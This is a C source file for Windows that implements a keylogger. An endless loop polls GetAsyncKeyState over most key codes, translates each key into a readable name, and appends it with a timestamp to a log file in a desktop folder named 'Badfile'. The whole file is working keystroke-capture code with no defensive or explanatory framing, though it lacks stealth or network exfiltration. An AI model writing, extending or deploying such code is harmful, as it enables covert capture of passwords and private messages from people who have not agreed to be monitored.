#include <stdio.h>
#include <windows.h>
#include <time.h>



void create_folder(const char *folderPath) {
    // Use CreateDirectory function to create the folder
    if (!CreateDirectory(folderPath, NULL)) {
    }
}

void log_key(char *key) {
    FILE *file;
    char folderPath[256];
    char filepath[256];

    // Construct the folder path and file path
    snprintf(folderPath, sizeof(folderPath), "C:\\Users\\user\\Desktop\\Badfile"); // Adjust folder path as needed
    snprintf(filepath, sizeof(filepath), "%s\\log.txt", folderPath);

    // Create the folder if it doesn't exist
    create_folder(folderPath);

    // Open the log file
    file = fopen(filepath, "a+");
    if (file != NULL) {
        // Get the current time
        time_t rawtime;
        struct tm *timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);

        // Write time and key to the file
        fprintf(file, "%02d-%02d-%04d %02d:%02d:%02d: %s\n",
                timeinfo->tm_mday, timeinfo->tm_mon + 1, timeinfo->tm_year + 1900,
                timeinfo->tm_hour, timeinfo->tm_min, timeinfo->tm_sec, key);
        fclose(file);
    }
}

int main() {
    char c;
    while (1) {
        for (c = 8; c <= 190; c++) {
            // Check if a key has been pressed
            if (GetAsyncKeyState(c) == -32767) {
                char key[32] = {0}; // Increased size to avoid overflow
                // Handle special keys
                if (c == VK_SHIFT) {
                    strcpy(key, "SHIFT");
                } else if (c == VK_BACK) {
                    strcpy(key, "BACKSPACE");
                } else if (c == VK_RETURN) {
                    strcpy(key, "ENTER");
                } else if (c == VK_TAB) {
                    strcpy(key, "TAB");
                } else if (c == VK_CAPITAL) {
                    strcpy(key, "CAPS LOCK");
                } else if (c == VK_ESCAPE) {
                    strcpy(key, "ESCAPE");
                } else if (c == VK_SPACE) {
                    strcpy(key, "SPACE");
                }else if (c == VK_CONTROL){
                    strcpy(key,"Ctrl");
                } else if (c >= 48 && c <= 57) { // Numbers 0-9
                    key[0] = c;
                } else if (c >= 65 && c <= 90) { // Letters A-Z
                    if (GetKeyState(VK_CAPITAL) & 0x0001) {
                        key[0] = c; // Caps Lock is on
                    } else {
                        key[0] = c + 32; // Convert to lowercase
                    }
                } else if (c >= 96 && c <= 105) { // Numpad 0-9
                    key[0] = c - 48;
                } else if (c == VK_OEM_1) {
                    strcpy(key, ";:");
                } else if (c == VK_OEM_2) {
                    strcpy(key, "/?");
                } else if (c == VK_OEM_3) {
                    strcpy(key, "`~");
                } else if (c == VK_OEM_4) {
                    strcpy(key, "[{");
                } else if (c == VK_OEM_5) {
                    strcpy(key, "\\|");
                } else if (c == VK_OEM_6) {
                    strcpy(key, "]}");
                } else if (c == VK_OEM_7) {
                    strcpy(key, "'\"");
                } else if (c == VK_OEM_PLUS) {
                    strcpy(key, "=+");
                } else if (c == VK_OEM_COMMA) {
                    strcpy(key, ",<");
                } else if (c == VK_OEM_MINUS) {
                    strcpy(key, "-_");
                } else if (c == VK_OEM_PERIOD) {
                    strcpy(key, ".>");
                } else {
                    key[0] = c;
                }
                // Log the key
                log_key(key);
            }
        }
    }
    return 0;
}
